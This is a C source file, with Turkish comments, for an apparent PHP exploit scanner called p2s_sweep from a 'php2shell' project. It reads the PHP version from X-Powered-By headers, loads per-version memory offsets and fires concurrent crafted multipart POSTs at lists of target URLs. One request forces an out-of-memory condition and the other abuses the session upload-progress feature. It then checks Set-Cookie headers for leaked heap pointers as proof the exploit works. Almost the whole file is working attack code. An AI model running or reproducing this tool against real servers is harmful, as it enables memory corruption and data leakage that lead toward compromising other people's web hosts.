/* p2s_sweep.c — BIRLESIK sweep: URL → X-Powered-By → offset → concurrent OOM + leak
 *
 * Python gerektirmez. Tam URL kabul eder, otomatik versiyon + offset bulur.
 * Versiyon listede yoksa en yakin available surumu kullanir (fallback).
 *
 * Build (macOS arm64):
 *   cc -O2 -o p2s_sweep p2s_sweep.c \
 *     -I/opt/homebrew/opt/openssl@3/include \
 *     -L/opt/homebrew/opt/openssl@3/lib -lssl -lcrypto
 *
 * Run:
 *   ./p2s_sweep http://192.168.8.123:18113/index.php
 *   ./p2s_sweep --sizes 8,16,32 --tries 5 http://192.168.8.123:18113/index.php https://xxx.com/index.php
 *   ./p2s_sweep --file hosts.txt
 *   ./p2s_sweep --probe http://192.168.8.123:18113/index.php  (sadece probe, exploit yok)
 *
 * Signal:
 *   LEAK!  = heap pointer'lar Set-Cookie'de → worker corrupted → exploit calisiyor
 *   big    = cookie uzun ama heap pointer yok → belki
 *   clean  = 32B standart cookie → worker temiz
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <errno.h>
#include <dirent.h>
#include <libgen.h>
#include <netdb.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

/* ============ config ============ */
#define OFFSETS_DIR "/Users/<USER>/Desktop/php2shell/labs/versions"
#define MAX_URLS 64
#define RESP_CAP (1 << 20)
#define OOM_BND "S17"
#define LEAK_BND "BNDRY12345"

static int g_oom_mb = 12;
static int g_tries = 5;
static int g_probe_only = 0;
static int g_verbose = 1;

/* ============ URL parsing ============ */
typedef struct {
    char host[256];
    int port;
    char path[512];
    int tls;
    char scheme[16];
} URL;

static void parse_url(const char *in, URL *out) {
    memset(out, 0, sizeof(*out));
    out->port = 80;
    strcpy(out->path, "/");
    const char *p = in;
    while (*p == ' ' || *p == '\t') p++;

    if (strncmp(p, "https://", 8) == 0) {
        out->tls = 1;
        strcpy(out->scheme, "https");
        p += 8;
        out->port = 443;
    } else if (strncmp(p, "http://", 7) == 0) {
        strcpy(out->scheme, "http");
        p += 7;
    } else {
        out->port = 80;
        strcpy(out->scheme, "http");
    }

    /* extract host[:port][/path] */
    char buf[512];
    int i = 0;
    while (*p && *p != '/' && *p != ':' && i < 255) buf[i++] = *p++;
    buf[i] = 0;
    strncpy(out->host, buf, 255);

    if (*p == ':') {
        p++;
        out->port = atoi(p);
        while (*p && *p != '/') p++;
    }
    if (*p == '/') {
        i = 0;
        while (*p && i < 511) out->path[i++] = *p++;
        out->path[i] = 0;
    }
}

static const char *url_str(const URL *u) {
    static char buf[1024];
    snprintf(buf, sizeof(buf), "%s://%s:%d%s", u->scheme, u->host, u->port, u->path);
    return buf;
}

/* ============ HTTP helpers ============ */
static int tcp_connect(const char *host, int port) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    if (inet_pton(AF_INET, host, &addr.sin_addr) != 1) {
        /* try DNS */
        struct hostent *he = gethostbyname(host);
        if (!he) { close(fd); return -1; }
        memcpy(&addr.sin_addr, he->h_addr_list[0], 4);
    }
    int one = 1;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) { close(fd); return -1; }
    return fd;
}

/* simple ssl map (defined BEFORE tls_connect) */
#define MAX_SSL 32
static struct { int fd; SSL *ssl; SSL_CTX *ctx; } ssl_map[MAX_SSL];
static int ssl_map_n = 0;

static void store_ssl(int fd, SSL *ssl, SSL_CTX *ctx) {
    if (ssl_map_n < MAX_SSL) {
        ssl_map[ssl_map_n].fd = fd;
        ssl_map[ssl_map_n].ssl = ssl;
        ssl_map[ssl_map_n].ctx = ctx;
        ssl_map_n++;
    }
}
static SSL *get_ssl(int fd) {
    for (int i = 0; i < ssl_map_n; i++) if (ssl_map[i].fd == fd) return ssl_map[i].ssl;
    return NULL;
}
static void close_conn(int fd) {
    SSL *ssl = get_ssl(fd);
    if (ssl) { SSL_shutdown(ssl); SSL_free(ssl); }
    for (int i = 0; i < ssl_map_n; i++) if (ssl_map[i].fd == fd) { ssl_map[i].fd = -1; break; }
    close(fd);
}

static int tls_connect(const char *host, int port) {
    int fd = tcp_connect(host, port);
    if (fd < 0) return -1;
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, fd);
    SSL_set_tlsext_host_name(ssl, host);
    if (SSL_connect(ssl) <= 0) {
        SSL_free(ssl); SSL_CTX_free(ctx); close(fd); return -1;
    }
    store_ssl(fd, ssl, ctx);
    return fd;
}

static int conn_send(int fd, const void *buf, size_t len) {
    SSL *ssl = get_ssl(fd);
    if (ssl) return SSL_write(ssl, buf, len);
    return send(fd, buf, len, MSG_NOSIGNAL);
}
static int conn_recv(int fd, void *buf, size_t len) {
    SSL *ssl = get_ssl(fd);
    if (ssl) return SSL_read(ssl, buf, len);
    return recv(fd, buf, len, 0);
}

static int open_conn(const char *host, int port, int tls) {
    if (tls) return tls_connect(host, port);
    return tcp_connect(host, port);
}

/* GET and read headers, return X-Powered-By value (static buffer) */
static const char *http_get_xpb(const URL *u, int *status) {
    static char xpb[256] = "";
    *status = 0;
    int fd = open_conn(u->host, u->port, u->tls);
    if (fd < 0) return xpb;

    char hdr[512];
    int hlen = snprintf(hdr, sizeof(hdr),
        "GET %s HTTP/1.1\r\nHost: %s:%d\r\nConnection: close\r\n\r\n",
        u->path, u->host, u->port);
    conn_send(fd, hdr, hlen);

    char buf[4096];
    int total = 0;
    while (total < (int)sizeof(buf) - 1) {
        int n = conn_recv(fd, buf + total, sizeof(buf) - 1 - total);
        if (n <= 0) break;
        total += n;
    }
    buf[total] = 0;
    close_conn(fd);

    /* parse status */
    if (total > 12 && strncmp(buf, "HTTP/1.", 7) == 0)
        *status = atoi(buf + 9);

    /* parse X-Powered-By */
    const char *p = strcasestr(buf, "X-Powered-By:");
    if (p) {
        p += 13;
        while (*p == ' ' || *p == '\t') p++;
        int i = 0;
        while (*p && *p != '\r' && *p != '\n' && i < 255) xpb[i++] = *p++;
        xpb[i] = 0;
    }
    return xpb;
}

/* POST body, return status code. resp_buf receives response headers+body (capped). */
static int http_post(const URL *u, const char *body, size_t body_len,
                     const char *boundary, char *resp_buf, int resp_cap) {
    int fd = open_conn(u->host, u->port, u->tls);
    if (fd < 0) return 0;

    char hdr[512];
    int hlen = snprintf(hdr, sizeof(hdr),
        "POST %s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n\r\n",
        u->path, u->host, u->port, boundary, body_len);
    if (conn_send(fd, hdr, hlen) < 0) { close_conn(fd); return 0; }
    if (conn_send(fd, body, body_len) < 0) { close_conn(fd); return 0; }

    int total = 0;
    while (total < resp_cap) {
        int n = conn_recv(fd, resp_buf + total, resp_cap - total);
        if (n <= 0) break;
        total += n;
    }
    resp_buf[total] = 0;
    close_conn(fd);

    if (total > 12 && strncmp(resp_buf, "HTTP/1.", 7) == 0)
        return atoi(resp_buf + 9);
    return 0;
}

/* ============ version + offset loading ============ */
static int ver_match(const char *target, const char *avail) {
    /* 8.4.26 == 8.4.26 */
    return strcmp(target, avail) == 0;
}

static int ver_minor_match(const char *target, const char *avail) {
    /* 8.4.x matches 8.4.y */
    char tm[16], am[16];
    sscanf(target, "%15[.]", tm);
    sscanf(avail, "%15[.]", am);
    return strncmp(tm, am, strcspn(tm, ".")) == 0 &&
           (tm[strcspn(tm, ".")] == 0 || tm[strcspn(tm, ".")] == '.');
}

static int ver_major_match(const char *target, const char *avail) {
    /* 8.x matches 8.y */
    return target[0] == avail[0];
}

/* Load offsets from labs/versions/<ver>/offsets.env.
 * Returns 0 on success, -1 if not found.
 * If exact not found, tries same minor, then same major (closest). */
static int load_offsets(const char *version, unsigned long *zif, unsigned long *dtor,
                        char *used_ver, int used_ver_len) {
    if (!version || !version[0]) return -1;

    /* Try exact */
    char path[512];
    snprintf(path, sizeof(path), OFFSETS_DIR "/%s/offsets.env", version);
    FILE *f = fopen(path, "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "ZIF_OFFSET=")) {
                char *v = strchr(line, '=');
                *zif = strtoul(v + 1, NULL, 0);
            } else if (strstr(line, "DTOR_OFFSET=")) {
                char *v = strchr(line, '=');
                *dtor = strtoul(v + 1, NULL, 0);
            }
        }
        fclose(f);
        if (used_ver) strncpy(used_ver, version, used_ver_len - 1);
        return 0;
    }

    /* Try same minor (8.4.x → any 8.4.y) */
    DIR *d = opendir(OFFSETS_DIR);
    if (d) {
        char best[64] = "";
        int best_dist = 999999;
        struct dirent *e;
        char target_major[4] = "";
        char target_minor[4] = "";
        sscanf(version, "%3[^.].%3[^.]", target_major, target_minor);

        while ((e = readdir(d)) != NULL) {
            if (e->d_name[0] == '.') continue;
            if (ver_minor_match(version, e->d_name)) {
                /* calculate distance */
                int t_patch, a_patch;
                sscanf(version, "%*d.%*d.%d", &t_patch);
                sscanf(e->d_name, "%*d.%*d.%d", &a_patch);
                int dist = abs(t_patch - a_patch);
                if (dist < best_dist) { best_dist = dist; strncpy(best, e->d_name, 63); }
            }
        }
        closedir(d);

        if (best[0]) {
            snprintf(path, sizeof(path), OFFSETS_DIR "/%s/offsets.env", best);
            f = fopen(path, "r");
            if (f) {
                char line[256];
                while (fgets(line, sizeof(line), f)) {
                    if (strstr(line, "ZIF_OFFSET=")) {
                        char *v = strchr(line, '=');
                        *zif = strtoul(v + 1, NULL, 0);
                    } else if (strstr(line, "DTOR_OFFSET=")) {
                        char *v = strchr(line, '=');
                        *dtor = strtoul(v + 1, NULL, 0);
                    }
                }
                fclose(f);
                if (used_ver) strncpy(used_ver, best, used_ver_len - 1);
                return 0;
            }
        }

        /* Try same major (8.x → any 8.y.z, closest) */
        d = opendir(OFFSETS_DIR);
        if (d) {
            best[0] = 0;
            best_dist = 999999;
            int t_major, t_minor;
            sscanf(version, "%d.%d", &t_major, &t_minor);
            while ((e = readdir(d)) != NULL) {
                if (e->d_name[0] == '.') continue;
                int a_major, a_minor;
                if (sscanf(e->d_name, "%d.%d", &a_major, &a_minor) == 2 && a_major == t_major) {
                    int dist = abs(t_minor - a_minor) * 100;
                    if (dist < best_dist) { best_dist = dist; strncpy(best, e->d_name, 63); }
                }
            }
            closedir(d);
            if (best[0]) {
                snprintf(path, sizeof(path), OFFSETS_DIR "/%s/offsets.env", best);
                f = fopen(path, "r");
                if (f) {
                    char line[256];
                    while (fgets(line, sizeof(line), f)) {
                        if (strstr(line, "ZIF_OFFSET=")) {
                            char *v = strchr(line, '=');
                            *zif = strtoul(v + 1, NULL, 0);
                        } else if (strstr(line, "DTOR_OFFSET=")) {
                            char *v = strchr(line, '=');
                            *dtor = strtoul(v + 1, NULL, 0);
                        }
                    }
                    fclose(f);
                    if (used_ver) strncpy(used_ver, best, used_ver_len - 1);
                    return 0;
                }
            }
        }
    }
    return -1;
}

/* ============ body builders ============ */
typedef struct { char *buf; size_t off, cap; } B;

static void b_str(B *b, const char *s) {
    size_t n = strlen(s);
    if (b->off + n <= b->cap) { memcpy(b->buf + b->off, s, n); b->off += n; }
}
static void b_bytes(B *b, char c, size_t n) {
    if (b->off + n <= b->cap) { memset(b->buf + b->off, c, n); b->off += n; }
}
static void b_raw(B *b, const void *p, size_t n) {
    if (b->off + n <= b->cap) { memcpy(b->buf + b->off, p, n); b->off += n; }
}

static size_t build_oom_body(char *buf, size_t cap, int oom_mb) {
    B b = {buf, 0, cap};
    char tmp[256];

    for (int i = 0; i < 1001; i++) {
        int n = snprintf(tmp, sizeof(tmp),
            "--%s\r\nContent-Disposition: form-data; name=\"p%04d\"\r\n\r\nx\r\n",
            OOM_BND, i);
        b_raw(&b, tmp, n);
    }
    b_str(&b, "--S17\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n");
    b_raw(&b, "\x00", 1);
    b_str(&b, "\r\n");
    b_str(&b, "--S17\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\npwn\r\n");
    b_str(&b, "--S17\r\nContent-Disposition: form-data; name=\"f\"; filename=\"a.txt\"\r\nContent-Type: application/octet-stream\r\n\r\n");
    b_bytes(&b, 'A', 64);
    b_str(&b, "\r\n");
    b_str(&b, "--S17\r\nContent-Disposition: form-data; name=\"big\"\r\n\r\n");
    b_bytes(&b, 'B', (size_t)oom_mb * 1024 * 1024);
    b_str(&b, "\r\n--S17--\r\n");
    return b.off;
}

static size_t build_leak_body(char *buf, size_t cap) {
    B b = {buf, 0, cap};
    char tmp[256];

    b_str(&b, "--BNDRY12345\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\nattacksessionid0001\r\n");
    b_str(&b, "--BNDRY12345\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\npwn\r\n");
    for (int i = 0; i < 841; i++) {
        int n = snprintf(tmp, sizeof(tmp),
            "--BNDRY12345\r\nContent-Disposition: form-data; name=\"%d\"\r\n\r\nv%04d",
            1000 + i, i);
        b_raw(&b, tmp, n);
        b_bytes(&b, 'x', 44);
        b_str(&b, "\r\n");
    }
    b_str(&b, "--BNDRY12345\r\nContent-Disposition: form-data; name=\"1999\"\r\n\r\n");
    b_bytes(&b, 'A', 79);
    unsigned long long len = 0x1000;
    memcpy(b.buf + b.off - 79 + 0x10, &len, 8);
    b.buf[b.off - 79 + 0x18] = 'L';
    b_str(&b, "\r\n--BNDRY12345--\r\n");
    return b.off;
}

/* ============ signal detection ============ */
static int cookie_len(const char *resp) {
    const char *p = strstr(resp, "Set-Cookie: PHPSESSID=");
    if (!p) return 0;
    p += 22;
    int n = 0;
    while (*p && *p != ';' && *p != '\r' && *p != '\n') { n++; p++; }
    return n;
}

static int heap_ptrs(const unsigned char *buf, int len) {
    int cnt = 0;
    for (int i = 0; i + 8 <= len; i++) {
        unsigned long long v = 0;
        for (int j = 0; j < 8; j++) v |= (unsigned long long)buf[i+j] << (8*j);
        if (v >= 0x7F0000000000ULL && v < 0x800000000000ULL) cnt++;
    }
    return cnt;
}

/* ============ main ============ */
int main(int argc, char **argv) {
    URL urls[MAX_URLS];
    int n_urls = 0;
    int sizes[16]; int n_sizes = 0;
    sizes[0] = g_oom_mb; n_sizes = 1;
    char *hosts_file = NULL;

    /* parse args */
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--sizes") == 0 && i + 1 < argc) {
            n_sizes = 0;
            char *save = NULL;
            char *tok = strtok_r(argv[i+1], ",", &save);
            while (tok && n_sizes < 16) { sizes[n_sizes++] = atoi(tok); tok = strtok_r(NULL, ",", &save); }
            i++;
        } else if (strcmp(argv[i], "--tries") == 0 && i + 1 < argc) {
            g_tries = atoi(argv[i+1]); i++;
        } else if (strcmp(argv[i], "--probe") == 0) {
            g_probe_only = 1;
        } else if (strcmp(argv[i], "--file") == 0 && i + 1 < argc) {
            hosts_file = argv[i+1]; i++;
        } else if (argv[i][0] == '-' && argv[i][1] == '-') {
            /* skip unknown flags */
        } else {
            if (n_urls < MAX_URLS) parse_url(argv[i], &urls[n_urls++]);
        }
    }

    /* load hosts file */
    if (hosts_file) {
        FILE *f = fopen(hosts_file, "r");
        if (!f) { fprintf(stderr, "cannot open %s\n", hosts_file); return 1; }
        char line[512];
        while (fgets(line, sizeof(line), f) && n_urls < MAX_URLS) {
            line[strcspn(line, "\r\n")] = 0;
            if (line[0] == '#' || line[0] == 0) continue;
            parse_url(line, &urls[n_urls++]);
        }
        fclose(f);
    }

    if (n_urls == 0) {
        fprintf(stderr, "Usage: %s [--sizes 8,16,32] [--tries 5] [--probe] [--file hosts.txt] URL [URL...]\n", argv[0]);
        return 1;
    }

    /* OpenSSL init */
    SSL_library_init();
    SSL_load_error_strings();

    /* ===== PHASE 1: probe ===== */
    printf("%-45s %-10s %-12s %-12s %-10s\n", "URL", "ver", "ZIF", "DTOR", "source");
    printf("%-95s\n", "-------------------------------------------------------------------------------------------------------------------");

    unsigned long zif[MAX_URLS], dtor[MAX_URLS];
    char used_ver[MAX_URLS][64];
    char xpb[MAX_URLS][256];

    for (int i = 0; i < n_urls; i++) {
        const char *u = url_str(&urls[i]);
        int st;
        const char *x = http_get_xpb(&urls[i], &st);
        strncpy(xpb[i], x, 255);

        if (st == 0) {
            printf("%-45s %-10s\n", u, "ERR");
            zif[i] = dtor[i] = 0;
            continue;
        }

        /* extract version from X-Powered-By: "PHP/8.4.26" → "8.4.26" */
        char ver[32] = "";
        const char *slash = strchr(x, '/');
        if (slash) strncpy(ver, slash + 1, 31);

        if (load_offsets(ver, &zif[i], &dtor[i], used_ver[i], 64) == 0) {
            printf("%-45s %-10s 0x%08lx     0x%08lx     %s\n",
                   u, ver, zif[i], dtor[i], used_ver[i]);
        } else {
            printf("%-45s %-10s %-12s %-12s %-10s\n",
                   u, ver, "??", "??", "YOK");
            zif[i] = dtor[i] = 0;
        }
    }
    printf("%-95s\n", "-------------------------------------------------------------------------------------------------------------------");

    if (g_probe_only) return 0;

    /* ===== PHASE 2: concurrent OOM + leak ===== */
    /* pre-build bodies (shared across urls) */
    int max_oom_mb = sizes[0];
    for (int i = 1; i < n_sizes; i++) if (sizes[i] > max_oom_mb) max_oom_mb = sizes[i];

    size_t oom_cap = (size_t)max_oom_mb * 1024 * 1024 + 256 * 1024;
    char *oom_body = malloc(oom_cap);
    size_t leak_cap = 128 * 1024;
    char *leak_body = malloc(leak_cap);
    size_t leak_len = build_leak_body(leak_body, leak_cap);
    char *leak_resp = malloc(RESP_CAP);
    char *oom_resp = malloc(8192);

    printf("\n");

    for (int i = 0; i < n_urls; i++) {
        if (zif[i] == 0) {
            printf("\n=== %s  (no offsets — skip)\n", url_str(&urls[i]));
            continue;
        }
        printf("\n=== %s  PHP %s  ZIF=0x%lx DTOR=0x%lx (src: %s) ===\n",
               url_str(&urls[i]), xpb[i], zif[i], dtor[i], used_ver[i]);
        printf("  %4s | %6s | %8s | %5s | %s\n", "MB", "stLeak", "cookie", "cnt", "signal");
        printf("  %s\n", "-------------------------------------------------------");

        for (int s = 0; s < n_sizes; s++) {
            int oom_mb = sizes[s];
            size_t oom_len = build_oom_body(oom_body, oom_cap, oom_mb);

            for (int t = 0; t < g_tries; t++) {
                pid_t pid = fork();
                if (pid < 0) { perror("fork"); return 1; }

                if (pid == 0) {
                    /* CHILD: fire OOM */
                    http_post(&urls[i], oom_body, oom_len, OOM_BND, oom_resp, 8192);
                    _exit(0);
                } else {
                    /* PARENT: fire leak read concurrent */
                    int lstatus = http_post(&urls[i], leak_body, leak_len, LEAK_BND, leak_resp, RESP_CAP);
                    int clen = cookie_len(leak_resp);
                    int cnt = heap_ptrs((unsigned char *)leak_resp, (int)strlen(leak_resp));
                    const char *sig = (clen > 100 && cnt >= 8) ? "LEAK!" :
                                     (clen > 100) ? "big" : "clean";

                    if (g_verbose)
                        printf("  %4d | %6d | %7dB | %5d | %s\n",
                               oom_mb, lstatus, clen, cnt, sig);
                    fflush(stdout);
                    waitpid(pid, NULL, 0);
                }
                usleep(500000);
            }
            printf("\n");
        }
    }

    free(oom_body); free(leak_body); free(leak_resp); free(oom_resp);
    return 0;
}
